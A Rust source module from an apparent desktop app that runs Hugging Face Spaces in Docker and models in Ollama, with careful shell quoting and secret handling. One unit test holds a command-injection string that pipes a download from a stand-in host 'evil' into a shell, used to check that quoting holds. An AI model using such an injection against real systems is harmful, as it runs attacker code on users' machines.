//! Launch, track and stop the things the store runs: Spaces as Docker
//! containers, GGUF models inside Ollama. All long work runs in spawned tasks
//! that publish `instance://update` events.

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter, Manager};

use crate::build;
use crate::error::{Error, Result};
use crate::hf;
use crate::ollama;
use crate::state::AppState;
use crate::storage;
use crate::wsl::{self, slug};

const UPDATE_EVENT: &str = "instance://update";
const LOG_TAIL: usize = 20;
const CONTAINER_PREFIX: &str = "aias-";
/// Spaces download their weights from the Hub at startup; one shared named
/// volume means the second run of any Space (or a restart) skips the download.
const HF_CACHE_VOLUME: &str = "aias-hf-cache";
pub const OLLAMA_PORT: u16 = 11434;

/// The three bases a published Space port may answer on, same WSL2 quirk
/// `ollama.rs` already works around: the Windows side of localhost forwarding
/// listens on `[::1]` while some things bind `127.0.0.1` only (#73).
fn candidate_bases(port: u16) -> [String; 3] {
    [
        format!("http://localhost:{port}"),
        format!("http://[::1]:{port}"),
        format!("http://127.0.0.1:{port}"),
    ]
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Kind {
    Space,
    Model,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Status {
    Pulling,
    /// cloning and building the image on this machine
    Building,
    Starting,
    Running,
    Error,
    Stopped,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Instance {
    pub id: String,
    pub kind: Kind,
    pub repo: String,
    pub model_tag: Option<String>,
    pub display_name: String,
    pub status: Status,
    pub port: Option<u16>,
    pub url: Option<String>,
    pub error: Option<String>,
    pub log_tail: Vec<String>,
    pub started_at: String,
    /// image was built on this machine instead of pulled from the Hub
    pub local_build: bool,
    /// container was started with `--gpus all`; only these count as GPU
    /// residents (#58)
    #[serde(default)]
    pub gpu: bool,
}

fn now() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // ISO-ish without pulling in chrono: the UI only needs ordering.
    format!("{secs}")
}

fn container_name(id: &str) -> String {
    format!("{CONTAINER_PREFIX}{}", id.trim_start_matches("space-"))
}

fn free_port() -> Result<u16> {
    let l = std::net::TcpListener::bind(("127.0.0.1", 0))?;
    Ok(l.local_addr()?.port())
}

/// Apply `f` to the instance, then broadcast it.
fn update(app: &AppHandle, id: &str, f: impl FnOnce(&mut Instance)) {
    let state = app.state::<AppState>();
    let snapshot = {
        let mut map = match state.instances.lock() {
            Ok(m) => m,
            Err(_) => return,
        };
        let Some(inst) = map.get_mut(id) else { return };
        f(inst);
        inst.clone()
    };
    let _ = app.emit(UPDATE_EVENT, snapshot);
}

fn push_log(app: &AppHandle, id: &str, line: String) {
    update(app, id, |i| {
        if i.log_tail.len() >= LOG_TAIL {
            i.log_tail.remove(0);
        }
        i.log_tail.push(line);
    });
}

fn fail(app: &AppHandle, id: &str, msg: String) {
    log::error!("{id}: {msg}");
    update(app, id, |i| {
        i.status = Status::Error;
        i.error = Some(msg);
    });
}

pub fn list(state: &AppState) -> Vec<Instance> {
    state
        .instances
        .lock()
        .map(|m| m.values().cloned().collect())
        .unwrap_or_default()
}

fn insert(state: &AppState, inst: Instance) {
    if let Ok(mut m) = state.instances.lock() {
        m.insert(inst.id.clone(), inst);
    }
}

fn get(state: &AppState, id: &str) -> Option<Instance> {
    state.instances.lock().ok().and_then(|m| m.get(id).cloned())
}

fn require_ready(state: &AppState) -> Result<()> {
    if state.is_ready() {
        Ok(())
    } else {
        Err(Error::NotReady("install the runtime first".into()))
    }
}

// ---- Spaces ---------------------------------------------------------------

pub async fn launch_space(
    app: AppHandle,
    id: String,
    secrets: HashMap<String, String>,
) -> Result<Instance> {
    let state = app.state::<AppState>();
    require_ready(&state)?;
    let space = hf::space(state.inner(), &id).await?;
    if space.compat == hf::Compat::Incompatible {
        return Err(Error::Other(
            space
                .compat_reason
                .unwrap_or_else(|| "Space is not compatible".into()),
        ));
    }

    start_space(app, space, false, secrets).await
}

/// Build the Space's image on this machine, then run it. The path for GPUs the
/// Hub never built for (AMD, Intel, CPU) and for Spaces without an image.
pub async fn build_space(
    app: AppHandle,
    id: String,
    secrets: HashMap<String, String>,
) -> Result<Instance> {
    let state = app.state::<AppState>();
    require_ready(&state)?;
    let space = hf::space(state.inner(), &id).await?;
    if matches!(space.sdk.as_deref(), Some("static")) {
        return Err(Error::Other("static Spaces have nothing to build".into()));
    }
    start_space(app, space, true, secrets).await
}

async fn start_space(
    app: AppHandle,
    space: hf::SpaceSummary,
    local_build: bool,
    secrets: HashMap<String, String>,
) -> Result<Instance> {
    let state = app.state::<AppState>();
    let id = space.id.clone();
    let inst_id = format!("space-{}", slug(&id));
    // CPU-tier Spaces run without the GPU: the same rule Browse uses to skip
    // the gate, so they never count as residents either (#58).
    let gpu = state.has_gpu() && space.wants_gpu();
    let inst = Instance {
        id: inst_id.clone(),
        kind: Kind::Space,
        repo: id.clone(),
        model_tag: None,
        display_name: space.title.clone().unwrap_or_else(|| space.name.clone()),
        status: if local_build {
            Status::Building
        } else {
            Status::Pulling
        },
        port: None,
        url: None,
        error: None,
        log_tail: vec![],
        started_at: now(),
        local_build,
        gpu,
    };
    // The busy check and the reservation happen under one lock: two concurrent
    // launches for the same Space must not both pass the check and both spawn
    // a pull (#39).
    {
        let mut map = state
            .instances
            .lock()
            .map_err(|_| Error::Other("instance state poisoned".into()))?;
        if let Some(existing) = map.get(&inst_id) {
            if matches!(
                existing.status,
                Status::Pulling | Status::Building | Status::Starting | Status::Running
            ) {
                return Ok(existing.clone());
            }
        }
        map.insert(inst_id.clone(), inst.clone());
    }

    let cancel = state.begin_instance_launch(&inst_id);
    let vendor = state.vendor();
    let app2 = app.clone();
    tokio::spawn(async move {
        let launch = async {
            let image = if local_build {
                let app3 = app2.clone();
                let iid = inst_id.clone();
                let http = app2.state::<AppState>().http.clone();
                build::build_space(&http, &space, slug(&id).as_str(), vendor, move |l| {
                    push_log(&app3, &iid, l)
                })
                .await?
            } else {
                format!("registry.hf.space/{}:latest", slug(&id))
            };
            run_space(
                &app2,
                &inst_id,
                &image,
                &space,
                gpu,
                !local_build,
                &cancel,
                &secrets,
            )
            .await
        };
        if let Err(e) = launch.await {
            // A Stop mid-launch cancels the flag; the task exits quietly and
            // cleans up instead of reporting the cancellation as a failure (#35).
            if cancel.load(Ordering::SeqCst) {
                let cname = container_name(&inst_id);
                let _ = wsl::sh(&format!("docker rm -f {cname} >/dev/null")).await;
                log::info!("{inst_id}: launch cancelled by stop");
            } else {
                fail(&app2, &inst_id, e.to_string());
            }
        }
        app2.state::<AppState>()
            .end_instance_launch(&inst_id, &cancel);
    });
    Ok(inst)
}

/// HF Space images carry no CMD; the Hub starts them with a command derived
/// from the SDK. Mirror that, but leave images that define their own command alone.
fn space_command(sdk: Option<&str>, app_file: &str, app_port: u16, image_has_cmd: bool) -> String {
    if image_has_cmd {
        return String::new();
    }
    // `app_file` is allowlisted in `hf.rs`, but this string ends up inside a
    // root `bash -c` on the host distro: quote it anyway.
    let app_file = wsl::quote(app_file);
    match sdk {
        Some("gradio") => format!("python {app_file}"),
        Some("streamlit") => format!(
            "streamlit run {app_file} --server.port {app_port} --server.address 0.0.0.0 --server.headless true"
        ),
        _ => String::new(),
    }
}

/// Has the in-flight launch been told to stop?
fn cancelled(cancel: &Arc<AtomicBool>) -> bool {
    cancel.load(Ordering::SeqCst)
}

fn cancelled_err() -> Error {
    Error::Other("launch cancelled".into())
}

// `cancel` (#35/#76) and `secrets` (#57) each added one parameter on top of
// the existing five; a struct would help but is out of scope for this fix.
#[allow(clippy::too_many_arguments)]
async fn run_space(
    app: &AppHandle,
    id: &str,
    image: &str,
    space: &hf::SpaceSummary,
    gpu: bool,
    pull: bool,
    cancel: &Arc<AtomicBool>,
    secrets: &HashMap<String, String>,
) -> Result<()> {
    let cname = container_name(id);
    let app_port = space.app_port;
    if pull {
        push_log(app, id, format!("docker pull {image}"));
        let child = wsl::spawn_sh(&format!("docker pull {image} 2>&1"))?;
        let code = wsl::stream_lines(child, |l| push_log(app, id, l)).await?;
        if code != 0 {
            return Err(Error::Other(format!(
                "image pull failed ({code}); the Space may be private, gated, or have no image. Try Build locally."
            )));
        }
    }
    if cancelled(cancel) {
        return Err(cancelled_err());
    }

    let inspect = wsl::sh(&format!(
        "docker inspect -f '{{{{len .Config.Cmd}}}} {{{{len .Config.Entrypoint}}}}' {image}"
    ))
    .await?;
    let image_has_cmd = inspect
        .stdout
        .split_whitespace()
        .any(|n| n.parse::<u32>().map(|v| v > 0).unwrap_or(false));
    let command = space_command(
        space.sdk.as_deref(),
        &space.app_file,
        app_port,
        image_has_cmd,
    );
    if command.is_empty() && !image_has_cmd {
        return Err(Error::Other(format!(
            "image has no start command and SDK `{}` has no default; cannot launch",
            space.sdk.as_deref().unwrap_or("unknown")
        )));
    }

    // Docker creates a named volume as root the first time it is mounted, and a
    // Space runs as uid 1000 (`user`), so the cache must be handed over before
    // the first write or `hf_hub_download` dies with EACCES (#49). Done from
    // the distro (we are root there) on the volume's mountpoint: never by
    // running a binary from the untrusted image as root. Only the top level:
    // subdirectories are created by the Space itself.
    wsl::sh(&format!(
        "docker volume create {HF_CACHE_VOLUME} >/dev/null && \
         chown 1000:1000 \"$(docker volume inspect -f '{{{{.Mountpoint}}}}' {HF_CACHE_VOLUME})\""
    ))
    .await?
    .require("chown hf cache")?;
    if cancelled(cancel) {
        return Err(cancelled_err());
    }

    let port = free_port()?;
    let gpu_flag = if gpu { "--gpus all" } else { "" };
    let gpu_label = u8::from(gpu);
    let repo = &space.id;
    let publish = wsl::publish(port, app_port);
    let harden = wsl::HARDEN;
    // Caps a runaway Space at a share of the WSL2 VM's own memory ceiling
    // (#64); `None` before the first runtime probe leaves the container uncapped.
    let mem_cap = app.state::<AppState>().container_memory_cap_mb();
    let mem_flag = mem_cap
        .map(|mb| format!("--memory {mb}m --memory-swap {mb}m"))
        .unwrap_or_default();
    // Gated models need the user's HF token (#60); a Space that reads its own
    // secrets (#57) gets the values the launch flow collected. Names go into
    // the shell string bare, so each one is checked before it touches it;
    // values are hostile input and always go through `wsl::quote`.
    let mut extra_env = String::new();
    if let Some(token) = app.state::<AppState>().hf_token() {
        let q = wsl::quote(&token);
        extra_env.push_str(&format!(" -e HF_TOKEN={q} -e HUGGING_FACE_HUB_TOKEN={q}"));
    }
    for (name, value) in secrets {
        if !hf::valid_env_name(name) {
            log::warn!("{id}: skipping secret with an invalid name `{name}`");
            continue;
        }
        let q = wsl::quote(value);
        extra_env.push_str(&format!(" -e {name}={q}"));
    }
    let run = format!(
        "docker rm -f {cname} >/dev/null 2>&1; \
         docker run -d --name {cname} {gpu_flag} {publish} {harden} {mem_flag} \
           --label aias.kind=space --label aias.repo='{repo}' --label aias.port={port} \
           --label aias.gpu={gpu_label} \
           -v {HF_CACHE_VOLUME}:/home/user/.cache/huggingface \
           -e HF_HOME=/home/user/.cache/huggingface \
           -e PORT={app_port} -e GRADIO_SERVER_NAME=0.0.0.0 -e GRADIO_SERVER_PORT={app_port}{extra_env} \
           {image} {command}"
    );
    update(app, id, |i| {
        i.status = Status::Starting;
        i.port = Some(port);
    });
    push_log(
        app,
        id,
        format!("docker run {publish} {gpu_flag} {image} {command}"),
    );
    wsl::sh(&run).await?.require("docker run")?;
    if cancelled(cancel) {
        return Err(cancelled_err());
    }

    let base = wait_for_http(app, id, port, &cname, cancel, &space.id).await?;
    update(app, id, |i| {
        i.status = Status::Running;
        i.url = Some(base);
    });
    Ok(())
}

/// Poll the published port on every candidate base until one answers, or the
/// container dies. Returns whichever base answered so the caller stores the
/// URL that actually works (#73); a gated-repo error in the log tail fails
/// fast with the repo to request access to instead of a 40-line traceback (#60).
async fn wait_for_http(
    app: &AppHandle,
    id: &str,
    port: u16,
    cname: &str,
    cancel: &Arc<AtomicBool>,
    repo: &str,
) -> Result<String> {
    let http = reqwest::Client::builder()
        .no_proxy()
        .timeout(Duration::from_secs(3))
        .build()?;
    let bases = candidate_bases(port);
    let mut last_status: Option<u16> = None;
    // A Space may download its weights before it binds the port (MusicGen
    // preloads 2.8 GB, #51). Keep waiting while the container is alive: the
    // log tail shows progress and Stop is always available. 60 min is only a
    // safety net.
    for tick in 0..1800u32 {
        tokio::time::sleep(Duration::from_secs(2)).await;
        if cancelled(cancel) {
            return Err(cancelled_err());
        }
        // Only a page that actually renders counts; a 500 from a half-started
        // or broken app must not be reported as Running.
        for base in &bases {
            if let Ok(resp) = http.get(format!("{base}/")).send().await {
                let st = resp.status();
                if st.is_success() || st.is_redirection() {
                    return Ok(base.clone());
                }
                if last_status != Some(st.as_u16()) {
                    last_status = Some(st.as_u16());
                    push_log(app, id, format!("GET {base}/ -> {st}"));
                }
            }
        }
        if tick % 5 == 4 {
            let probe = format!(
                "docker inspect -f '{{{{.State.Running}}}}' {cname} 2>/dev/null; docker logs --tail 5 {cname} 2>&1"
            );
            if let Ok(o) = wsl::sh(&probe).await {
                let mut lines = o.stdout.lines();
                let running = lines.next().map(str::trim) == Some("true");
                for l in lines {
                    // Gated repos die deep in a download traceback; surfacing
                    // just this fails fast with something the user can act on
                    // instead of a 40-line stack trace (#60).
                    if l.contains("GatedRepoError") || l.contains("401 Client Error") {
                        return Err(Error::Other(format!(
                            "needs a Hugging Face token with access to {repo}; see https://huggingface.co/{repo}"
                        )));
                    }
                    push_log(app, id, l.to_string());
                }
                if !running {
                    return Err(Error::Other(
                        "container exited before serving; see log".into(),
                    ));
                }
            }
        }
    }
    Err(Error::Other(match last_status {
        Some(code) => format!("app answers HTTP {code} instead of a page; see log"),
        None => "timed out waiting for the app to answer on its port".into(),
    }))
}

// ---- Models ---------------------------------------------------------------

pub async fn launch_model(app: AppHandle, repo: String, quant: String) -> Result<Instance> {
    let state = app.state::<AppState>();
    require_ready(&state)?;
    if quant.is_empty()
        || !quant
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
    {
        return Err(Error::Other(format!("`{quant}` is not a model tag")));
    }
    // `owner/name` is a Hugging Face GGUF repo; a bare name is an Ollama
    // library model (e.g. `qwen2.5vl` + `7b`), which is how vision models ship.
    let tag = if repo.contains('/') {
        hf::validate_repo(&repo)?;
        format!("hf.co/{repo}:{quant}")
    } else {
        if repo.is_empty()
            || !repo
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
        {
            return Err(Error::Other(format!("`{repo}` is not a model name")));
        }
        format!("{repo}:{quant}")
    };
    let inst_id = format!("model-{}", slug(&format!("{repo}-{quant}")));
    let (_, name) = hf::split_repo(&repo);
    let inst = Instance {
        id: inst_id.clone(),
        kind: Kind::Model,
        repo: repo.clone(),
        model_tag: Some(tag.clone()),
        display_name: format!("{name} ({quant})"),
        status: Status::Pulling,
        port: Some(OLLAMA_PORT),
        url: None,
        error: None,
        log_tail: vec![],
        started_at: now(),
        local_build: false,
        gpu: false,
    };
    // Same atomicity requirement as `start_space` (#39): the busy check and
    // the reservation happen under one lock.
    {
        let mut map = state
            .instances
            .lock()
            .map_err(|_| Error::Other("instance state poisoned".into()))?;
        if let Some(existing) = map.get(&inst_id) {
            if matches!(
                existing.status,
                Status::Pulling | Status::Starting | Status::Running
            ) {
                return Ok(existing.clone());
            }
        }
        map.insert(inst_id.clone(), inst.clone());
    }

    let cancel = state.begin_instance_launch(&inst_id);
    let app2 = app.clone();
    tokio::spawn(async move {
        if let Err(e) = run_model(&app2, &inst_id, &tag, &cancel).await {
            if cancel.load(Ordering::SeqCst) {
                log::info!("{inst_id}: launch cancelled by stop");
            } else {
                fail(&app2, &inst_id, e.to_string());
            }
        }
        app2.state::<AppState>()
            .end_instance_launch(&inst_id, &cancel);
    });
    Ok(inst)
}

async fn run_model(app: &AppHandle, id: &str, tag: &str, cancel: &Arc<AtomicBool>) -> Result<()> {
    push_log(app, id, format!("ollama pull {tag}"));
    let child = ollama::spawn(&app.state::<AppState>(), &["pull", tag])?;
    let mut last = String::new();
    let code = wsl::stream_lines(child, |l| {
        // Progress bars repeat the same prefix hundreds of times; keep changes only.
        if l != last {
            last = l.clone();
            push_log(app, id, l);
        }
    })
    .await?;
    if code != 0 {
        return Err(Error::Other(format!(
            "ollama pull failed ({code}); see log"
        )));
    }
    if cancelled(cancel) {
        let _ = ollama::run(&app.state::<AppState>(), &["stop", tag]).await;
        return Err(cancelled_err());
    }

    update(app, id, |i| i.status = Status::Starting);
    push_log(app, id, "loading model into memory".into());
    // Warm the model through the API (works for WSL and native Ollama alike).
    let http = reqwest::Client::builder()
        .no_proxy()
        .timeout(Duration::from_secs(600))
        .build()?;
    let base = ollama::reachable_base()
        .await
        .ok_or_else(|| Error::NotReady("Ollama is not answering".into()))?;
    http.post(format!("{base}/api/generate"))
        .json(&serde_json::json!({ "model": tag, "keep_alive": "30m" }))
        .send()
        .await?
        .error_for_status()
        .map_err(|e| Error::Other(format!("ollama load: {e}")))?;
    if cancelled(cancel) {
        let _ = ollama::run(&app.state::<AppState>(), &["stop", tag]).await;
        return Err(cancelled_err());
    }
    let o = ollama::run(&app.state::<AppState>(), &["ps"]).await?;
    if let Some(line) = o.stdout.lines().find(|l| l.contains(tag)) {
        push_log(app, id, line.trim().to_string());
    }
    update(app, id, |i| {
        i.status = Status::Running;
        i.url = Some(format!("http://localhost:{OLLAMA_PORT}/v1"));
    });
    Ok(())
}

// ---- lifecycle ------------------------------------------------------------

pub async fn stop(app: AppHandle, id: String) -> Result<()> {
    let state = app.state::<AppState>();
    let Some(inst) = get(&state, &id) else {
        return Err(Error::Other(format!("no instance `{id}`")));
    };
    // Tell an in-flight launch to bail before it can revive what we are about
    // to stop (#35).
    state.cancel_instance_launch(&id);
    match inst.kind {
        Kind::Space => {
            let cname = container_name(&id);
            // `docker rm` failing must not be reported as a successful stop:
            // the container, and whatever GPU memory it holds, is still there
            // (#34). Stdout is discarded but stderr is kept for `.require()`.
            if let Err(e) = wsl::sh(&format!("docker rm -f {cname} >/dev/null"))
                .await
                .and_then(|o| o.require("docker rm"))
            {
                update(&app, &id, |i| i.error = Some(e.to_string()));
                return Err(e);
            }
        }
        Kind::Model => {
            if let Some(tag) = &inst.model_tag {
                let _ = ollama::run(&state, &["stop", tag]).await;
            }
        }
    }
    update(&app, &id, |i| {
        i.status = Status::Stopped;
        i.url = None;
        i.error = None;
    });
    Ok(())
}

/// A model was unloaded from Ollama behind the instance's back (GPU memory
/// scheduling); reflect that on every instance that served the tag.
pub fn mark_model_unloaded(app: &AppHandle, tag: &str) {
    let state = app.state::<AppState>();
    let ids: Vec<String> = state
        .instances
        .lock()
        .map(|m| {
            m.values()
                .filter(|i| i.kind == Kind::Model && i.model_tag.as_deref() == Some(tag))
                .filter(|i| i.status == Status::Running)
                .map(|i| i.id.clone())
                .collect()
        })
        .unwrap_or_default();
    for id in ids {
        push_log(
            app,
            &id,
            "unloaded to free GPU memory for another launch".into(),
        );
        update(app, &id, |i| {
            i.status = Status::Stopped;
            i.url = None;
        });
    }
}

pub async fn remove(app: AppHandle, id: String) -> Result<()> {
    let state = app.state::<AppState>();
    let Some(inst) = get(&state, &id) else {
        return Ok(());
    };
    state.cancel_instance_launch(&id);
    if inst.kind == Kind::Space {
        let cname = container_name(&id);
        // Same rule as `stop` (#34): a failed remove must not desync the
        // tracked map from what is actually still running.
        if let Err(e) = wsl::sh(&format!("docker rm -f {cname} >/dev/null"))
            .await
            .and_then(|o| o.require("docker rm"))
        {
            update(&app, &id, |i| i.error = Some(e.to_string()));
            return Err(e);
        }
    }
    if let Ok(mut m) = state.instances.lock() {
        m.remove(&id);
    }
    // Only when nothing else references it (#63); Stopped instances never do.
    storage::maybe_remove_image(&state, &inst).await;
    let mut gone = inst;
    gone.status = Status::Stopped;
    let _ = app.emit(UPDATE_EVENT, gone);
    Ok(())
}

/// Re-adopt containers left from a previous session (labels tell us what they are).
pub async fn discover(app: &AppHandle) {
    let state = app.state::<AppState>();
    if state.discovered.load(Ordering::SeqCst) || !state.is_ready() {
        return;
    }
    // Claim the discovery before the probe, not after: two concurrent callers
    // (the UI polls `list_instances` repeatedly) must not both run it. A
    // failed probe releases the claim so the next call retries instead of
    // leaving the fleet unadopted for the rest of the app's life (#38).
    if state
        .discovered
        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return;
    }
    let list = "docker ps --filter label=aias.kind=space --format '{{.Names}}\t{{.Label \"aias.repo\"}}\t{{.Label \"aias.port\"}}\t{{.Status}}\t{{.Label \"aias.gpu\"}}'";
    let o = match wsl::sh(list).await {
        Ok(o) => o,
        Err(_) => {
            state.discovered.store(false, Ordering::SeqCst);
            return;
        }
    };
    for line in o.stdout.lines() {
        let parts: Vec<&str> = line.split('\t').collect();
        if parts.len() < 4 {
            continue;
        }
        let cname = parts[0];
        let repo = parts[1].to_string();
        let port: Option<u16> = parts[2].parse().ok();
        let id = format!("space-{}", cname.trim_start_matches(CONTAINER_PREFIX));
        if get(&state, &id).is_some() {
            continue;
        }
        let (_, name) = hf::split_repo(&repo);
        insert(
            &state,
            Instance {
                id: id.clone(),
                kind: Kind::Space,
                repo,
                model_tag: None,
                display_name: name,
                status: Status::Running,
                port,
                url: port.map(|p| format!("http://localhost:{p}")),
                error: None,
                log_tail: vec![format!("adopted running container ({})", parts[3])],
                started_at: now(),
                local_build: false,
                gpu: parts.get(4).map(|g| g.trim() == "1").unwrap_or(false),
            },
        );
        if let Some(inst) = get(&state, &id) {
            let _ = app.emit(UPDATE_EVENT, inst);
        }
    }
}

// ---- reconcile --------------------------------------------------------------
// A periodic check for instances whose container died, or was stopped, behind
// the app's back (#68). See `reconcile.rs` for the loop itself.

/// Space instances believed to be running, paired with their container name:
/// what the reconcile loop needs to build one `docker ps` liveness check for
/// every instance at once, instead of one `docker inspect` each.
pub fn running_spaces(state: &AppState) -> Vec<(String, String)> {
    state
        .instances
        .lock()
        .map(|m| {
            m.values()
                .filter(|i| {
                    i.kind == Kind::Space && matches!(i.status, Status::Running | Status::Starting)
                })
                .map(|i| (i.id.clone(), container_name(&i.id)))
                .collect()
        })
        .unwrap_or_default()
}

/// A tracked instance's container is gone; flip it to Error the same way a
/// dead container caught during `wait_for_http` is reported.
pub fn mark_container_gone(app: &AppHandle, id: &str) {
    log::warn!("{id}: container is gone; marking Error");
    update(app, id, |i| {
        i.status = Status::Error;
        i.error = Some("container exited".into());
        i.url = None;
    });
}

/// The WSL2 distro stopped: nothing inside it survives. Every Space instance
/// stops, and on NVIDIA (where Ollama runs inside the distro too) every model
/// does as well; on AMD/Intel, native Ollama is unaffected (#69).
pub fn mark_all_stopped_by_distro_loss(app: &AppHandle) {
    let state = app.state::<AppState>();
    let ollama_in_distro = state.vendor() == crate::hardware::Vendor::Nvidia;
    let ids: Vec<String> = state
        .instances
        .lock()
        .map(|m| {
            m.values()
                .filter(|i| {
                    matches!(
                        i.status,
                        Status::Pulling | Status::Building | Status::Starting | Status::Running
                    ) && (i.kind == Kind::Space || ollama_in_distro)
                })
                .map(|i| i.id.clone())
                .collect()
        })
        .unwrap_or_default();
    for id in ids {
        state.cancel_instance_launch(&id);
        log::warn!("{id}: WSL distro stopped; marking Stopped");
        update(app, &id, |i| {
            i.status = Status::Stopped;
            i.url = None;
            i.error = Some("WSL distro stopped".into());
        });
    }
}

#[cfg(test)]
mod tests {
    use super::{candidate_bases, space_command};

    #[test]
    fn derives_start_command() {
        assert_eq!(
            space_command(Some("gradio"), "app.py", 7860, false),
            "python 'app.py'"
        );
        assert!(space_command(Some("streamlit"), "main.py", 8501, false)
            .starts_with("streamlit run 'main.py'"));
        assert_eq!(space_command(Some("docker"), "app.py", 7860, true), "");
        assert_eq!(space_command(Some("docker"), "app.py", 7860, false), "");
    }

    /// A Space card can say anything; the start command must never let it
    /// break out of the argument position.
    #[test]
    fn start_command_quotes_hostile_app_file() {
        let hostile = "app.py\ncurl evil | sh; `id`";
        assert_eq!(
            space_command(Some("gradio"), hostile, 7860, false),
            format!("python '{hostile}'")
        );
    }

    /// The three bases a published Space port may answer on, in the same
    /// order `ollama.rs` already tries them (#73).
    #[test]
    fn candidate_bases_try_localhost_then_the_wsl2_fallbacks() {
        assert_eq!(
            candidate_bases(7860),
            [
                "http://localhost:7860".to_string(),
                "http://[::1]:7860".to_string(),
                "http://127.0.0.1:7860".to_string(),
            ]
        );
    }
}
